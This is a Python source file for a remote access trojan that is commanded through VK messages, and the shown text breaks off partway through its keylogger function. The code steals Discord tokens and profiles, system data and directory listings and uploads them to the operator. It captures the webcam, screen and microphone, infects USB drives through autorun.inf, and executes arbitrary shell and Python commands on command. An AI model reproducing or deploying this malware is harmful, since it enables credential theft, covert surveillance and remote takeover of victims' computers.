# -*- coding: utf-8 -*-

# Remote Access Tool.
# Author: Kirill Zhosul.
# https://github.com/kirillzhosul/python-remote-access

# Default modules.
import typing  # Type hinting.
import json  # JSON Parsing.
import requests  # IP API, Discord API.
import os  # System interaction (Environment variables).
import os.path  # System path interaction.
import subprocess  # Console.
import shutil  # Copy files.
import atexit  # At exit handler.
import sys  # System interaction (argv, platform).
import threading  # Threading for message showing (blocking operation).
import datetime  # Datetime for alive command.
import re  # Expressions for discord.

# If true, show debug messages in console.
DEBUG = True

try:
    # Other modules (Not is preinstalled).
    # TODO: Move at server setup (but for now there is no NON-VK server types.)
    import vk_api  # VK API Itself.
    import vk_api.utils  # VK API Utils.
    import vk_api.upload  # VK API Uploading.
    # There is vk_api.longpoll / vk_api.bot_longpoll imports in server connection,
    # As there is checks for current server type (to not cause import conflicts).
except ImportError as exception:
    # If there is import error.

    if DEBUG:
        # If debug is enabled.

        # Printing message.
        print(f"[Importing] Cannot import {exception}!")

    # Exiting.
    sys.exit(1)

# Features.

# Keylogger (Will not launch at the start).
FEATURE_KEYLOGGER_ENABLED: bool = False

# Drives watching (Sends message when user update drive)(Disable drives infection).
FEATURE_DRIVES_WATCHING_ENABLED: bool = False

# Drives infection (Writes autorun.inf when connect new drive).
FEATURE_DRIVES_INFECTION_ENABLED: bool = False

# Registers self to the registry autorun key.
FEATURE_AUTORUN_ENABLED: bool = False

# Grabs HWID at the startup (WARNING: Slow, use `get_hwid` command instead)
FEATURE_STARTUP_HWID_GRABBING_ENABLED: bool = False

# Grabs Discor information at the startup (WARNING: Slow, use `discord_profile` command instead).
FEATURE_STARTUP_DISCORD_GRABBING_ENABLED = False

# Other.

# IP When can`t get.
DEFAULT_INVALID_IP = "0.0.0.0.0"

# HWID When can`t get.
DEFAULT_INVALID_HWID = "00000000-0000-0000-0000-000000000000"

# TAGS When can`t get.
DEFAULT_INVALID_TAGS = ["PC", "TAGS_LOADING_ERROR"]

# System OK code.
SYSTEM_OK_STATUS_CODE: int = 0

# Drives that we will skip when infecting drives.
DRIVES_INFECTION_SKIPPED = ("C", "D")

# Not allowes to register self to the registry when running not ".exe" file.
DISALLOW_NOT_EXECUTABLE_AUTORUN = True

# Version of the tool.
VERSION = "[Pre-release] 0.5.5"


# Commands.
# Function: initialise_commands()
commands_functions: typing.Dict[str, typing.Callable] = dict()
commands_help: typing.Dict[str, typing.Tuple] = dict()


# Settings.

# Config data.
config: typing.Dict = {}

# Client name.
# Function: load_name()
client_name: str = "CLIENT_INITIALISATION_ERROR"

# Client tags.
# Function load_tags()
client_tags: typing.List[str] = ["CLIENT_INITIALISATION_ERROR"]


# Other.

# Work folder.
# Function: set_folder_path()
folder: str = ""

# Current directory for the files commands.
current_directory = os.getcwd()

# Keylogger string.
keylogger_buffer: str = ""

# `python` command output container.
out = None

# Server.
# Function: server_connect()

# VK API Object.
server_api = None

# VK API Longpoll (longpoll / bot_longpoll).
server_longpoll = None


def command_taskkill(_arguments, _event) -> str:
    # @function command_taskkill()
    # @returns str
    # @description Function for command "taskkill" that kills process.

    # Calling system.
    _system_result = os.system(f"taskkill /F /IM {_arguments}")

    if _system_result == SYSTEM_OK_STATUS_CODE:
        # If result is OK.

        # Returning success.
        return "Killed task!"
    else:
        # If result is not OK.

        # Returning error.
        return "Unable to kill this task!"


def command_upload(_arguments, _event) -> str:
    # @function command_upload()
    # @returns str
    # @description Function for command "upload" that uploads file on the client PC.

    # Returning message.
    return ""


def command_properties(_arguments, _event) -> str:
    # @function command_properties()
    # @returns str
    # @description Function for command "properties" that returns properties of the file.

    if os.path.exists(_arguments):
        # If path exists.

        # Getting size.
        _property_size = f"{filesystem_get_size(_arguments)}MB"

        # Getting type.
        _property_type = filesystem_get_type(_arguments)

        # Getting time properties.
        _property_created_at = os.path.getctime(_arguments)
        _property_accessed_at = os.path.getatime(_arguments)
        _property_modified_at = os.path.getmtime(_arguments)

        # Returning properties.
        return f"Path: {_arguments},\n" \
               f"Size: {_property_size},\n" \
               f"Type: {_property_type},\n" \
               f"Modified: {_property_modified_at},\n" \
               f"Created: {_property_created_at},\n" \
               f"Accessed: {_property_accessed_at}."
    else:
        # If path not exists.

        # Error.
        return "Path does not exists!"


def command_download(_arguments, _event) -> typing.List:
    # @function command_download()
    # @returns str
    # @description Function for command "download" that downloads files.

    if os.path.exists(_arguments):
        # If path exists.
        if os.path.isfile(_arguments):
            # If this is file.

            if filesystem_get_size(_arguments) < 1536:
                # If file is below need size.

                # Uploading.
                return [_arguments, "Download", "doc"]  # noqa
            else:
                # If invalid size.
                return "Too big file! Maximal size for download: 1536MB(1.5GB)"  # noqa
        elif os.path.isdir(_arguments):
            # If this is directory.

            if filesystem_get_size(_arguments) < 1536:
                # If file is below need size.

                # Uploading.
                return "Directories are not allowed for now!"  # noqa
            else:
                # If invalid size.
                return "Too big file! Maximal size for download: 1536MB(1.5GB)"  # noqa
    else:
        # If path not exists.

        # Error.
        return "Path does not exists"  # noqa


def command_ddos(_arguments, _event) -> str:
    # @function command_ddos()
    # @returns str
    # @description Function for command "ddos" that starts ddos.

    # Getting arguments.
    _arguments = _arguments.split(";")

    if len(_arguments) >= 1:
        # If arguments OK.

        if len(_arguments) > 2 and _arguments[2] == "admin":
            # If admin.

            # Pinging from admin.
            os.system(f"ping -c {_arguments[0]} {_arguments[1]}")

            # Message.
            return "Completed DDoS (Admin)"

        # Pinging from user.
        os.system(f"ping {_arguments[0]}")

        # Message.
        return "Completed DDoS (User)"
    else:
        # Message.
        return "Incorrect arguments! Example: address;time;admin"


def command_ls(arguments, _event) -> str:
    # @function command_ls()
    # @returns str
    # @description Function for command "str" that lists all files in directory.

    # Returning.
    return ", ".join(filesystem_try_listdir(arguments if arguments != "" else current_directory))


def command_cd(_arguments, _event) -> str:
    # @function command_cd()
    # @returns str
    # @description Function for command "cd" that changes directory.

    # Globalising current directory.
    global current_directory

    if os.path.exists(current_directory + "\\" + _arguments):
        # If this is local folder.

        # Changing.
        current_directory += _arguments

        # Message.
        return f"Changed directory to {current_directory}"
    else:
        # If not local path.
        if os.path.exists(_arguments):
            # If path exists - moving there.

            # Changing.
            current_directory = _arguments

            # Message.
            return f"Changed directory to {current_directory}"
        else:
            # If invalid directory.

            # Message.
            return f"Directory {_arguments} does not exists!"


def command_location(_arguments, _event) -> str:
    # @function command_location()
    # @returns str
    # @description Function for command "location" that returns location of the PC.

    # Getting ip data.
    _ip = get_ip()

    if "ip" in _ip and "city" in _ip and "country" in _ip and "region" in _ip and "org" in _ip:
        # If correct fields.

        # Getting ip data.
        _ipaddress = _ip["ip"]  # noqa
        _ipcity = _ip["city"]  # noqa
        _ipcountry = _ip["country"]  # noqa
        _ipregion = _ip["region"]  # noqa
        _ipprovider = _ip["org"]  # noqa

        # Returning.
        return f"IP: {_ipaddress}," \
               f"\nCountry: {_ipcountry}," \
               f"\nRegion: {_ipregion}," \
               f"\nCity: {_ipcity}," \
               f"\nProvider: {_ipprovider}."
    else:
        # If not valid fields.

        # Returning error.
        return "Couldn't get location"


def command_microphone(_arguments, _event) -> typing.List:
    # @function command_microphone()
    # @returns str
    # @description Function for command "microphone" that returns voice message with the microphone.

    try:
        # Trying to import modules.

        # Importing.
        import pyaudio
        import wave
    except ImportError:
        # If there is import error.

        # Not supported.
        return "This command does not supported on selected PC! (pyaduio/wave module is not installed)"  # noqa

    # Getting path.
    _path = folder + "Microphone.wav"

    # Recording.
    record_microphone(_path, _arguments)

    # Message with uploading.
    return [_path, "Microphone", "audio_message"]


def command_help(_arguments, _event) -> str:
    # @function command_help()
    # @returns str
    # @description Function for command "help" that returns list of all commands.

    # Getting arguments.
    _arguments = _arguments.split(";")

    if len(_arguments) > 0 and _arguments[0] != "":
        # If command given.

        # Getting command.
        _help_command = _arguments[0]

        if _help_command not in commands_help:
            # If command not exists.

            # Error.
            return f"Command {_help_command} not exists!"

        _help_information = commands_help[_help_command]
        # Returning information.
        return f"[{_help_command}]:\n-- {_help_information[0]}\n--(Use: {_help_information[1]})"
    else:
        # If total help.

        _help = ""

        for _command, _information in commands_help.items():
            _help += f"[{_command}]: \n--{_information[0]}\n-- (Use: {_information[1]})\n"

        # Returning.
        return _help  # noqa


def command_tags_new(_arguments, _event) -> str:
    # @function command_tags_new()
    # @returns str
    # @description Function for command "tags_new" that replaces tags.

    # Globalising tags
    global client_tags

    # Clearing tags list.
    client_tags = []

    # Getting arguments.
    _arguments = _arguments.split(";")

    if len(_arguments) == 0:
        # If no arguments.

        # Message.
        return "Incorrect arguments! Example: (tags separated by ;)"

    # Tags that was added.
    _new_tags = []

    for _tag in _arguments:
        # For tags in arguments.

        # Getting clean tag.
        _clean_tag = _tag.replace(" ", "-")

        # Adding it.
        _new_tags.append(_clean_tag)

    if len(_new_tags) != 0:
        # If tags was added.

        # Replacing tags.
        client_tags = []

        # Adding new tags
        client_tags.extend(_new_tags)

        # Saving tags.
        save_tags()

        # Message.
        return f"Added new tags: {_new_tags}"
    else:
        # Message.
        return "Replacing was not completed! No tags passed!"


def command_tags_add(_arguments: str, _event) -> str:
    # @function command_tags_add()
    # @returns str
    # @description Function for command "tags_add" that add tags.

    # Getting arguments.
    _arguments = _arguments.split(";")

    if len(_arguments) == 0:
        # If no arguments.

        # Message.
        return "Incorrect arguments! Example: (tags separated by ;)"

    # Globalising tags.
    global client_tags

    # Tags that was added.
    _new_tags = []

    for _tag in _arguments:
        # For tags in arguments.

        # Getting clean tag.
        _clean_tag = _tag.replace(" ", "-")

        # Adding it.
        client_tags.append(_clean_tag)
        _new_tags.append(_clean_tag)

    # Saving tags.
    save_tags()

    # Message.
    return f"Added new tags: {_new_tags}"


def command_message(_arguments: str, _event) -> str:
    # @function command_message()
    # @returns str
    # @description Function for command "message" that shows message.

    try:
        # Trying to import module.

        # Importing module.
        import ctypes
    except ImportError:
        # If there is import error.

        # Not supported.
        return "This command does not supported on selected PC! (ctypes module is not installed)"  # noqa

    # Getting arguments.
    _arguments = _arguments.split(";")

    # Passing arguments.
    if len(_arguments) == 0:
        # If there is no arguments.

        # Message
        return "Incorrect arguments! Example: text;title;style"

    if len(_arguments) == 1:
        # If there is only text.

        # Adding title.
        _arguments.append("")

    if len(_arguments) == 2:
        # If there is only text and title.

        #  Styles:
        #  0 : OK
        #  1 : OK | Cancel
        #  2 : Abort | Retry | Ignore
        #  3 : Yes | No | Cancel
        #  4 : Yes | No
        #  5 : Retry | Cancel
        #  6 : Cancel | Try Again | Continue

        # To also change icon, add these values to previous number
        # 16 Stop-sign icon
        # 32 Question-mark icon
        # 48 Exclamation-point icon
        # 64 Information-sign icon consisting of an 'i' in a circle
        # Adding title.
        _arguments.append(0)  # noqa

    # Calling message.
    try:
        # Trying to show message.

        # Thread function.
        def __ctypes_message_thread():
            ctypes.windll.user32.MessageBoxW(0, _arguments[0], _arguments[1], int(_arguments[2]))

        # Creating thread.
        _thread = threading.Thread(target=__ctypes_message_thread)

        # Starting thread.
        _thread.start()
    except Exception as _exception:  # noqa
        # If there is error.

        # Message.
        return f"Error when showing message! Error: {_exception}"

    # Message.
    return "Message was shown!"


def command_webcam(_arguments, _event) -> typing.List:
    # @function command_webcam()
    # @returns list
    # @description Function for command "webcam" that returns webcam photo.

    try:
        # Trying to import opencv-python.

        # Importing.
        import cv2
    except ImportError:
        # If there is import error.

        # Not supported.
        return "This command does not supported on selected PC! (opencv-python (CV2) module is not installed)"  # noqa

    # Globalising folder.
    global folder

    # Getting camera.
    _camera = cv2.VideoCapture(0)

    # Getting image.
    _, _image = _camera.read()

    # Getting path.
    _path = folder + "webcam.png"

    # Building path.
    filesystem_build_path(_path)

    # Writing file.
    cv2.imwrite(_path, _image)

    # Deleting camera.
    del _camera

    # Returning uploading.
    return [_path, "Webcam", "photo"]


def command_screenshot(_arguments, _event) -> typing.List:
    # @function command_screenshot()
    # @returns list
    # @description Function for command "screenshot" that returns screenshot.

    try:
        # Trying to import.

        # Importing.
        import PIL.ImageGrab
    except ImportError:
        # If there is import error.

        # Not supported.
        return "This command does not supported on selected PC! (Pillow module is not installed)"  # noqa

    # Taking screenshot.
    screenshot = PIL.ImageGrab.grab()

    # Getting path.
    _path = folder + "Screenshot.jpg"

    # Saving it.
    screenshot.save(_path)

    # Message with uploading.
    return [_path, "Screenshot", "photo"]


def command_python(_arguments, _event) -> str:
    # @function command_python()
    # @returns str
    # @description Function for command "python" that executes python code.

    # Executing.
    return execute_python(_arguments, globals(), locals())


def command_tags(_arguments, _event) -> str:
    # @function command_tags()
    # @returns str
    # @description Function for command "tags" that returns all tags.

    # Returning.
    return str(", ".join(client_tags))


def command_version(_arguments, _event) -> str:
    # @function command_version()
    # @returns str
    # @description Function for command "version" that returns current version.

    # Returning.
    return VERSION


def command_name_new(_arguments, _event) -> str:
    # @function command_name_new()
    # @returns str
    # @description Function for command "name_new" that changes name to other.

    # Global name.
    global client_name

    if type(_arguments) == str and len(_arguments) > 0:
        # If correct arguments.

        # Changing name.
        client_name = _arguments

        # Saving name
        save_name()
        # Returning.
        return f"Name changed to {client_name}"
    else:
        # If name is not valid.

        # Returning.
        return f"Invalid name!"


def command_destruct(_arguments, _event) -> str:
    # @function command_destruct()
    # @returns str
    # @description Function for command "destruct" that destroys self from the system.

    # Unregistering from the autorun.
    autorun_unregister()

    # Removing working folder path.
    filesystem_try_delete(folder)

    # Exiting.
    return command_exit(_arguments, _event)


def command_keylog(_arguments, _event) -> str:
    # @function command_keylog()
    # @returns str
    # @description Function for command "keylog" that returns keylog string.

    # Returning.
    return keylogger_buffer


def command_link(_arguments, _event) -> str:
    # @function command_link()
    # @returns str
    # @description Function for command "link" that opens link in the browser.

    try:
        # Trying to open with the module.

        # Importing module.
        import webbrowser

        # Opening link.
        webbrowser.open(_arguments)

        # Message.
        return "Link was opened (Via module)!"
    except ImportError:
        # If there is ImportError.

        # Opening with system.
        os.system("open {_arguments}")

        # Message.
        return "Link was opened (Via system)!"


def command_drives(_arguments: str, _event) -> str:
    # @function command_drives()
    # @returns Str
    # @description Function for command "drive" that returns list of the all drives in the system separated by ,(comma).

    # Returning.
    return ", ".join(filesystem_get_drives_list())


def command_discord_tokens(_arguments: str, _event) -> str:
    """ Command "discord_tokens" that returns list of the all discord tokens founded in system ,(comma). """

    # Getting tokens.
    _tokens = stealer_steal_discord_tokens()

    if len(_tokens) == 0:
        # If not found any tokens.

        # Error.
        return "Tokens not found in system!"

    # Returning.
    return ",\n".join(_tokens)


def command_alive(*args, **kwargs):
    # Getting current time.
    _current_time = datetime.datetime.now().strftime("%H:%M:%S")
    return f"Alive! Time: {_current_time}"


def command_discord_profile_raw(_arguments: str, _event) -> str:
    """ Сommand "discord_profile" that returns information about discord found in system(as raw dict). """

    # Getting tokens.
    _tokens = stealer_steal_discord_tokens()

    if len(_tokens) == 0:
        # If not found any tokens.

        # Error.
        return "Tokens not found in system!"

    # Returning.
    return json.dumps(stealer_steal_discord_profile(_tokens), indent=2)


def spreading_infect_drive(_drive: str) -> None:
    # @function spreading_infect_drive()
    # @returns list
    # @description Function that infects drive with given symbol.

    # TODO: Make autorun folder hidden.

    if not FEATURE_DRIVES_INFECTION_ENABLED:
        # If infection disabled.

        # Returning.
        return

    try:
        # Trying to infect drive.

        if _drive in DRIVES_INFECTION_SKIPPED:
            # If this drive in skipped drives.

            # Returning and not infecting.
            return

        # Code below copies trojan executable in secret folder,
        # And adds this executable in to drive autorun file.

        # Getting executable path.
        _executable_path = "autorun\\autorun." + executable_get_extension()

        if not os.path.exists(_drive + _executable_path):
            # If no executable file there (Not infected already).

            # Building path.
            filesystem_build_path(_drive + _executable_path)

            # Copying executable there.
            shutil.copyfile(sys.argv[0], _drive + _executable_path)

            # Writing autorun.inf file.
            with open(_drive + "autorun.inf", "w") as _autorun:
                # Opening file.

                # Writing.
                _autorun.write(f"[AutoRun]\nopen={_executable_path}\n\naction=Autorun\\Autorun")
    except Exception as _exception:  # noqa
        # If there is exception occurred.

        # Showing debug message to the developer.
        debug_message(f"Oops... Exception occurred in function spreading_infect_drive()! "
                      f"Full exception information - {_exception}")


def spreading_thread() -> None:
    # @function spreading_thread()
    # @returns None
    # @description Function for thread of the spreading, spreads virus.

    try:
        # Trying to spread.

        # Getting list of the all current drives.
        _current_drives = filesystem_get_drives_list()

        while True:
            # Infinity loop.

            # Getting latest drives list.
            _latest_drives = filesystem_get_drives_list()

            # Getting connected and disconnected drives.
            _connected_drives = list_difference(_latest_drives, _current_drives)
            _disconnected_drives = list_difference(_current_drives, _latest_drives)

            # Processing connecting of the drives.
            if _connected_drives:
                # Notifying server about connecting and infecting.
                for _drive in _connected_drives:
                    # For every drive in connected drives.

                    # Server message.
                    server_message(f"[Spreading] Connected drive {_drive}!")
                    debug_message(f"[Spreading] Connected drive {_drive}!")

                    # Infecting drive.
                    spreading_infect_drive(_drive)

            # Processing disconnecting of the drives.
            if _disconnected_drives:
                # Notifying server about disconnecting.

                for _drive in _disconnected_drives:
                    # For every drive in disconnected drives.

                    # Server message.
                    server_message(f"[Spreading] Disconnected drive {_drive}!")
                    debug_message(f"[Spreading] Disconnected drive {_drive}!")

            # Updating current drives.
            _current_drives = filesystem_get_drives_list()

    except Exception as _exception:  # noqa
        # If there is exception occurred.

        # Showing debug message to the developer.
        debug_message(f"Oops... Exception occurred in function spreading_thread()! "
                      f"Full exception information - {_exception}")


def spreading_start() -> None:
    # @function spreading_start()
    # @returns None
    # @description Function that starts app spreading.

    if not FEATURE_DRIVES_WATCHING_ENABLED:
        # If spreading is disabled.

        # Returning.
        return

    # Starting listening drives.
    threading.Thread(target=spreading_thread).start()


def assert_operating_system() -> None:
    # @function assert_operating_system()
    # @returns None
    # @description Function that asserting that operating system,
    # @description on which current instance of the trojan is launched are supported.

    # Tuple with all platforms (NOT OPERATING SYSTEM) that are supported for the app.
    _supported_platforms = ("win32", "linux")

    # Tuple with all platforms (NOT OPERATING SYSTEM) that are only partially supported,
    # and just showing debug message for the it.
    _development_platforms = ("linux",)

    for _platform in _supported_platforms:
        # Iterating over all platforms in the supported platforms.

        if sys.platform.startswith(_platform):
            # If current PC is have this platform (Supported).

            if _platform in _development_platforms:
                # If this is development platform.

                # Showing debug message.
                debug_message("You are currently running this app on platform {_platform} "
                              "which is not fully supported!")

            # Returning from the function as current platform is supported.
            return

    # Code lines below only executes if code above don't found supported platform.

    # Debug message.
    debug_message("Oops... You are running app on the platform "
                  "{sys.platform} which is not supported! Sorry for that!")

    # Raising SystemExit (Exiting code)
    raise SystemExit


def save_name() -> None:
    # @function save_name()
    # @returns None
    # @description Function that saves name to the file.

    try:
        # Trying to save name.

        # Getting path.
        _path = folder + "name.dat"

        # Building path.
        filesystem_build_path(_path)

        with open(_path, "w", encoding="UTF-8") as _tf:
            # With opened file.

            # Writing name.
            _tf.write(str(client_name))
    except Exception as _exception:  # noqa
        # If there is exception occurred.

        # Showing debug message to the developer.
        debug_message(f"Oops... Exception occurred in function save_name()! "
                      f"Full exception information - {_exception}")


def load_name() -> None:
    # @function load_name()
    # @returns None
    # @description Function that loads all name data.

    # Globalising name.
    global client_name

    try:
        # Trying to load name.

        # Getting path.
        _path = folder + "name.dat"

        # Building path.
        filesystem_build_path(_path)

        if os.path.exists(_path):
            # If we have name file.

            try:
                # Trying to read name.

                # Clearing name.
                client_name = ""

                with open(_path, "r", encoding="UTF-8") as _nf:
                    # With opened file.

                    # Reading name.
                    client_name = str(_nf.read())
            except Exception as exception:  # noqa
                # If there is exception occurred.

                # Debug message.
                debug_message(f"Can`t load name file! Exception: {exception}")

                # Name.
                client_name = get_ip()["ip"]  # noqa

                # Saving name.
                save_name()
        else:
            # If we don't have name file.

            # Name.
            __NAME = get_ip()["ip"]  # noqa

            # Saving name.
            save_name()
    except Exception as _exception:  # noqa
        # If there is exception occurred.

        # Showing debug message to the developer.
        debug_message(f"Oops... Exception occurred in function load_name()! "
                      f"Full exception information - {_exception}")

        # Name.
        __NAME = get_ip()["ip"]  # noqa


def stealer_steal_data(_force: bool = False):
    # @function stealer_steal_data()
    # @returns None
    # @description Function that steals all the data from the client.

    data: typing.Dict[str, typing.Any] = dict()

    try:
        # Trying to steal.

        if not stealer_is_already_worked() or _force:
            # If we not already stolen data or forcing.

            # Getting file name.
            _path = folder + "log.json"

            # Getting ip data.
            _ip = get_ip()

            # Getting path data.
            _userprofile = os.getenv("userprofile")
            _drive = os.getcwd().split("\\")[0]

            # Writing values.
            data["internet_ipaddress"] = _ip["ip"]  # noqa
            data["internet_city"] = _ip["city"]  # noqa
            data["internet_country"] = _ip["country"]  # noqa
            data["internet_region"] = _ip["region"]  # noqa
            data["internet_provider"] = _ip["org"]  # noqa

            if FEATURE_STARTUP_HWID_GRABBING_ENABLED:
                # If HWID is not disabled.

                # Writing HWID.
                data["computer_hardware_index"] = get_hwid()

            if not sys.platform.startswith('linux'):
                # If not linux.

                # Windows values.
                data["computer_username"] = os.getenv("UserName")
                data["computer_name"] = os.getenv("COMPUTERNAME")
                data["computer_operating_system"] = os.getenv("OS")
                data["computer_processor"] = os.getenv("NUMBER_OF_PROCESSORS") + " cores "
                data["computer_processor"] += os.getenv("PROCESSOR_ARCHITECTURE") + " "
                data["computer_processor"] += os.getenv("PROCESSOR_IDENTIFIER") + " "
                data["computer_processor"] += os.getenv("PROCESSOR_LEVEL") + " "
                data["computer_processor"] += os.getenv("PROCESSOR_REVISION")
                data["computer_environment_variables"] = get_environment_variables()
                data["directory_downloads"] = filesystem_try_listdir(_userprofile + "\\Downloads")
                data["directory_documents"] = filesystem_try_listdir(_userprofile + "\\Documents")
                data["directory_desktop"] = filesystem_try_listdir(_userprofile + "\\Desktop")
                data["directory_root"] = filesystem_try_listdir(_drive + "\\")
                data["directory_programfiles"] = filesystem_try_listdir(_drive + "\\Program Files")
                data["directory_programfiles86"] = filesystem_try_listdir(_drive + "\\Program Files (x86)")
                if FEATURE_STARTUP_DISCORD_GRABBING_ENABLED:
                    data["discord_tokens"] = stealer_steal_discord_tokens()
                    data["discord_profile"] = stealer_steal_discord_profile(data["discord_tokens"])

            # Building path.
            filesystem_build_path(_path)

            with open(_path, "w") as _file:
                # With opened file.

                # Dumping.
                json.dump(data, _file, indent=4)

            for _peer in config["server"]["vk"]["peers"]:
                # For every peer in peers.

                # Uploading document.
                uploading_status, uploading_result = server_upload_document(_path, "Log File", _peer, "doc")

                # Message.
                if uploading_status and isinstance(uploading_result, str):
                    # If all is ok.

                    # Message.
                    server_message(f"[Stealer] Stolen data:", uploading_result, _peer)
                else:
                    # If there is error.

                    # Message.
                    server_message(f"[Stealer] Error when uploading stolen data: {uploading_result}", None, _peer)

            # Returning value.
            return data
    except Exception as _exception:  # noqa
        # If there is exception occurred.

        # Showing debug message to the developer.
        debug_message(f"Oops... Exception occurred in function steal_data()! "
                      f"Full exception information - {_exception}")

        # Returning value.
        return {_exception}


def client_answer_server(event) -> None:
    # @function client_answer_server()
    # @returns None
    # @description Function that process message from the remote access (server).

    if config["server"]["type"] == "VK_USER":
        message = event.message
    elif config["server"]["type"] == "VK_GROUP":
        message = event.message
    else:
        message = event

    # Getting text from the event.
    _text = message.text

    # Getting peer from the event.
    _peer = message.peer_id

    # Text of the response.
    _response_text = None

    # Attachment of the response.
    _response_attachment = None

    try:
        # Trying to answer.

        # Getting arguments from the message (Message split by space).
        _message_arguments = _text.split(";")

        if len(_message_arguments) == 0:
            # If empty.

            # Returning.
            return

            # Getting tags.
        _message_tags = _message_arguments[0]
        _message_arguments.pop(0)

        if _message_tags == "alive":
            # If this is network command (That is work without tags and for all).

            if peer_is_allowed(_peer):
                # If peer is alowed

                # Answering that we in network.
                _response_text = command_alive("", event)
            else:
                # If not is admin.

                # Answering with an error.
                _response_text = "Sorry, but you don't have required permissions to make this command!"
        else:
            # If this is not alive command.

            if list_intersects(parse_tags(_message_tags), client_tags):
                # If we have one or more tag from our tags.

                if peer_is_allowed(_peer):
                    # If peer is allowed.

                    if len(_message_arguments) == 0:
                        # If there is no tags + command.

                        # Responding with error.
                        _response_text = "Invalid request! Message can`t be parsed! Try: tag1, tag2; command; args"
                    else:
                        # If there is no error.

                        # Getting command itself.
                        _message_command = str(_message_arguments[0]).lower().replace(" ", "")
                        _message_arguments.pop(0)

                        # Getting arguments (Joining all left list indices together).
                        _command_arguments = ";".join(_message_arguments)

                        # Executing command.
                        _execution_response = execute_command(_message_command, _command_arguments, event)

                        if type(_execution_response) == list:
                            # If response is list.

                            # Uploading attachment to the message.

                            if len(_execution_response) < 3:
                                # If invalid length.

                                # Getting error response.
                                _response_text = "Invalid attachment response from the executing of command!"
                            else:
                                # If all correct.

                                # Uploading.

                                # Getting values.
                                _uploading_path = _execution_response[0]
                                _uploading_title = _execution_response[1]
                                _uploading_type = _execution_response[2]

                                if _uploading_type == "photo":
                                    # If this is just photo.

                                    # Uploading photo on the server.
                                    _uploading_result = server_upload_photo(_uploading_path)

                                    # Moving result to attachment.
                                    _response_text = _uploading_title
                                    _response_attachment = _uploading_result
                                elif _uploading_type in ("doc", "audio_message"):
                                    # If this is document or audio message.

                                    # Uploading file on the server.
                                    _uploading_result = server_upload_document(_uploading_path, _uploading_title,
                                                                               _peer, _uploading_type)

                                    if type(_uploading_result) == str:
                                        # If uploading file result is string then all OK.

                                        # Setting response.
                                        _response_text = _uploading_title
                                        _response_attachment = _uploading_result
                                    else:
                                        # If there is an error.

                                        # Setting response.
                                        _response_text = f"Error when uploading document: {_uploading_result}"

                                    # Trying to delete.
                                    filesystem_try_delete(_uploading_path)
                        else:
                            # If default string response.
                            # Getting text.
                            _response_text = _execution_response
                else:
                    # If not is admin.

                    # Answering with an error.
                    _response_text = "Sorry, but you don't have required permissions to make this command!"
            else:
                # If lists of tags not intersects.

                # Returning.
                return
    except Exception as _exception:  # noqa
        # If there an exception.

        # Getting exception answer.
        _response_text = f"Oops... There is exception while client try to answer message. " \
                         f"Exception information: {_exception}"

    # Answering server.
    if _response_text is not None:
        # If response was not void from execution function.

        # Answering.
        server_message(f"{_response_text}", _response_attachment, _peer)
    else:
        # None answer.
        server_message(f"Void... (No response)", _response_attachment, _peer)


def server_upload_photo(_path: str) -> str:
    # @function server_upload_photo()
    # @returns str
    # @description Function that  uploads photo on the server.

    # Getting uploader.
    _uploader = vk_api.upload.VkUpload(server_api)

    # Uploading photo.
    _photo = _uploader.photo_messages(_path)
    _photo = _photo[0]

    if "owner_id" in _photo and "id" in _photo and "access_key" in _photo:
        # If photo have all those fields.

        # Getting photo fields.
        _owner_id = _photo['owner_id']
        _photo_id = _photo['id']
        _access_key = _photo['access_key']

        # Returning photo URN.
        return f'photo{_owner_id}_{_photo_id}_{_access_key}'

    # Returning blank.
    return ""


def execute_python(_code: str, _globals: typing.Dict, _locals: typing.Dict) -> any:
    # @function server_upload_photo()
    # @returns any
    # @description Function that executes python code and returns it out in variable out.

    # Getting global out.
    global out

    # Getting clean code.
    clean_code = _code.replace("&gt;", ">").replace("&lt;", "<").replace('&quot;', "'").replace('&tab', '   ')

    try:
        # Trying to execute.

        # Executing replaced code.
        exec(clean_code, _globals, _locals)
    except Exception as exception:  # noqa
        # If there is an error.

        # Returning.
        return f"Python code exception: {exception}"

    try:
        # Trying to return out.

        # Returning out.
        return out
    except NameError:
        # If there is an name error.

        # Returning.
        return f"Python code does not return output! Write in out"


# Commands.

def command_discord_profile(*args, **kwargs) -> str:
    """ Command `discord_profile` that returns information about Discord found in system ,(comma)."""

    # Getting tokens.
    tokens = stealer_steal_discord_tokens()

    if len(tokens) == 0:
        # If not found any tokens.

        # Error.
        return "Discord tokens not found in system!"

    # Getting profile.
    profile = stealer_steal_discord_profile(tokens)

    if profile:
        # Getting avatar.
        # TODO: Why there is some of IDs?.

        # Get avatar.
        if avatar := None and ("avatar" in profile and profile["avatar"]):
            avatar = "\n\n" + f"https://cdn.discordapp.com/avatars/636928558203273216/{profile['avatar']}.png"

        # Returning.
        return f"[ID{profile['id']}]\n[{profile['email']}]\n[{profile['phone']}]\n{profile['username']}" + avatar
    else:
        # If can`t get.

        # Error.
        return "Failed to get Discord profile!"


def command_exit(*args, **kwargs) -> str:
    """ Command `exit` that exists app. """

    # Exiting.
    sys.exit(0)

    # Message.
    return "Exiting..."  # noqa


def command_shutdown(*args, **kwargs) -> str:
    """ Command `shutdown` that shutdown system. """

    # Shutdown.
    os.system("shutdown /s /t 0")

    # Message.
    return "Shutdowning system (`shutdown /s /t 0`)..."


def command_restart(*args, **kwargs) -> str:
    """ Command `restart` that restarts system. """

    # Restarting.
    os.system("shutdown /r /t 0")

    # Message.
    return "Restarting system (`shutdown /r /t 0`)..."


def command_console(arguments, *args, **kwargs) -> str:
    """ Command `console` that executing console. """

    # Call console.
    console_response = os.system(arguments)

    # Executing system and returning result.
    if console_response == SYSTEM_OK_STATUS_CODE:
        # If OK
        
        # OK Mesasge.
        return f"Console status code: OK (Returned - {console_response})"

    # Error.
    return f"Console status code: ERROR (Returned - {console_response})"


# Client.

def execute_command(command_name: str, arguments: str, event) -> str:
    """ Function that executes command and return it result. """

    for command in commands_functions:  # noqa
        # For all commands names in commands dict.

        if command_name == command:
            # If it is this commands.

            # Executing command and returning result.
            return commands_functions[command](arguments, event)

    # Default answer.
    return f"Invalid command {command_name}! Write `help` command to get all commands!"


# Debug.

def debug_message(message: str) -> None:
    """ Show debug message if debug mode."""

    if not DEBUG:
        # If debug is not enabled.

        # Returning.
        return

    # Printing message.
    print(message)


# Keylogger.

def keylogger_start() -> None:
    """ Starts keylogger (Add keyboard callback). """

    if not FEATURE_KEYLOGGER_ENABLED:
        # If keylogger is disabled.

        # Returning.
        debug_message("[Keylogger] Not starting, as disabled...")
        return

    try:
        # Trying to import keyboard module which is not preinstalled.

        # Importing keyboard module.
        import keyboard
    except ImportError:
